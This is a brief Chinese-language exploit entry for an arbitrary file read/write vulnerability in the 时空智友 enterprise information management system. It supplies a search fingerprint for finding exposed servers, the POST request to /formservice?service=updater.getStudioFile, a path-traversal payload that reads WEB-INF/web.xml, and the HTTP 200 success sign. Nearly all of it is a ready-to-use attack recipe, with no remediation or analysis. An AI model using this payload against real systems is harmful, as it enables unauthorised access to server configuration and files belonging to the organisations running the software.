# 时空智友企业信息管理系统updater.getStudioFile任意文件读取漏洞

时空智友企业信息管理系统updater.getStudioFile ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="时空智友企业信息管理"`
- **请求**：`POST /formservice?service=updater.getStudioFile HTTP/1.1`

**Payload**
```
..\..\WEB-INF/web.xml
```
- **响应特征**：200